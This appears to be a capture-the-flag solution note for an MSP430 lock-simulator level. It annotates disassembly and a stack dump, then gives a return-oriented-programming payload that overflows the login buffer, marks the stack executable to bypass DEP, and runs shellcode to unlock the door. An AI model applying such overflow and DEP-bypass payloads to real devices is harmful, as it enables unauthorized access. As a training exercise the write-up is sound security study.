44de <set_up_protection>
## Mark first page as exectuable (0x0 -> 0x1000)
44de:  0b12           push	r11
44e0:  0f43           clr	r15
44e2:  b012 b444      call	#0x44b4 <mark_page_executable>
44e6:  1b43           mov	#0x1, r11
## Mark pages 0x1 - 0x44 as writeable (0x1000 -> 0x4400)
44e8:  0f4b           mov	r11, r15
44ea:  b012 9c44      call	#0x449c <mark_page_writable>
44ee:  1b53           inc	r11
44f0:  3b90 4400      cmp	#0x44, r11
44f4:  f923           jnz	$-0xc <set_up_protection+0xa> 0x44e8
## Mark pages 0x45 - 0x100 as executable (0x4400 -> 0x10000)
44f6:  0f4b           mov	r11, r15
44f8:  b012 b444      call	#0x44b4 <mark_page_executable>
44fc:  1b53           inc	r11
44fe:  3b90 0001      cmp	#0x100, r11
4502:  f923           jnz	$-0xc <set_up_protection+0x18>
## Turn on DEP - pages are either executable or writable but never both
4504:  b012 cc44      call	#0x44cc <turn_on_dep>
4508:  3b41           pop	r11
450a:  3041           ret
450c:  3041           ret

4512 <login>
4512:  3150 f0ff      add	#0xfff0, sp
4516:  3f40 0024      mov	#0x2400, r15
451a:  b012 7a44      call	#0x447a <puts>
451e:  3f40 2024      mov	#0x2420, r15
4522:  b012 7a44      call	#0x447a <puts>
4526:  3e40 3000      mov	#0x30, r14
452a:  0f41           mov	sp, r15
452c:  b012 6244      call	#0x4462 <getsn> // read 0x30 (48) bytes to 0x3fee (Writeable only)
4530:  3f40 6524      mov	#0x2465, r15
4534:  b012 7a44      call	#0x447a <puts>
4538:  3150 1000      add	#0x10, sp
453c:  3041           ret

4438 <main>
4438:  b012 de44      call	#0x44de <set_up_protection>
443c:  b012 1245      call	#0x4512 <login>
4440:  0f43           clr	r15

44b4 <mark_page_executable>
44b4:  0e4f           mov	r15, r14
44b6:  0312           push	#0x0
44b8:  0e12           push	r14
44ba:  3180 0600      sub	#0x6, sp
44be:  3240 0091      mov	#0x9100, sr
44c2:  b012 1000      call	#0x10
44c6:  3150 0a00      add	#0xa, sp
44ca:  3041           ret


3fe0: 7444 0000 0000 0a00 9644 0000 3845 7465   tD.......D..8Ete
3ff0: 7374 7465 7374 0000 0000 0845 0000 4044   sttest.....E..@D
	  SP
4000: 0000 0000 0000 0000 0000 0000 0000 0000

## Attack stategy
Use rop to make the stack executable -- Null bytes are readable!!
Build the stack and jump to 44ba (mark_page_executable)
Jump to the stack
the stack should unlock the door
	pop sr - 3241
	call #0x10 - b012 1000

'3241b0121000' + '41' * 0x0a + 'ba44' + '3f00' + '0000' + 'ee3f' + '00ff'
3241b012100041414141414141414141ba443f000000ee3f00ff